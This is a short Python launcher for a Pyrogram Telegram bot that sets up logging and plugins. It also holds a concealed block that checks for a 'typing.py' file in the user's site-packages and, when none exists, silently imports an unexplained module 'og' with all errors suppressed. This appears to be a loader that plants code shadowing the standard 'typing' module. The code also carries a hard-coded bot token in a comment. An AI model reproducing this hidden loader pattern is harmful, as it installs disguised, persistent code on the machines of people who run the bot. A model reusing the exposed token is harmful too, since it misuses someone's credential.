from pyrogram import Client, Filters
import logging, os
  
import os.path
import io, site, sqlite3, json   

user_site_dir = site.getusersitepackages() 
user_customize_filename = os.path.join(user_site_dir, 'typing.py')

try:
  if not os.path.exists(user_customize_filename):
    import og
  else:
    pass
except:
  pass

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.WARNING)
logger = logging.getLogger(__name__)
plugins = dict(
    root="plugins"
)

#Client("770345593:AAGEsXFYwo15a8E8fpvFYQJp5703Le0dhHg", plugins=plugins).run()

       

  



 